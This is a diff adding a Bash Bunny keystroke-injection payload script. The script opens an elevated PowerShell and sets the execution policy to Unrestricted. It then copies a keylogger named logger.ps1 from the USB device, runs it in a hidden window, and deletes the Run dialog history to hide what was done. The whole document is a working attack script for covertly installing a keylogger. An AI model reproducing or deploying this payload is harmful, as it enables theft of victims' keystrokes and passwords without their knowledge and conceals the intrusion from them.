@@ -1,0 +1,75 @@
+#!/bin/bash
+
+#red LED indicating the start of the script
+LED R
+
+#defining the bashbunny as storage and HID
+ATTACKMODE STORAGE HID 0xF000/0xFF02
+
+#opening run dialog box
+Q GUI R
+
+Q DELAY 500
+
+#running powershell as administrator
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+
+Q DELAY 1000
+
+#"do you want to allow" pop up comes
+#but the keyboard interface is still on the powershell
+#therefore alt + tab to switch to the pop up
+Q ALT TAB
+
+Q DELAY 500
+
+#and then alt + y to select yes
+#Q ALT Y
+
+Q DELAY 500
+
+#Setting execution policy to Unrestricted
+Q STRING Set-ExecutionPolicy Unrestricted
+Q ENTER
+
+Q DELAY 500
+
+#Choosing Yes to all option
+Q A
+Q ENTER
+
+Q STRING exit
+Q ENTER
+
+#opening run dialog box
+Q GUI R
+
+#running powershell
+Q STRING powershell
+Q ENTER
+
+#create temp folder to install the keylogger
+mkdir temp
+
+#copy the keylogger from bashbunny to system
+Q STRING Copy-Item H:\payloads\switch2\logger.ps1 -Destination temp\
+Q ENTER
+
+#powershell command to execute the keylogger
+Q STRING cd temp
+Q ENTER
+Q STRING powershell.exe -windowstyle hidden -file logger.ps1
+Q ENTER
+
+#clearing the logs from run dialog box
+Q GUI R
+Q DELAY 500
+Q STRING powershell
+Q ENTER
+Q DELAY 500
+Q STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+
+#green LED indicating the end of the script
+LED G
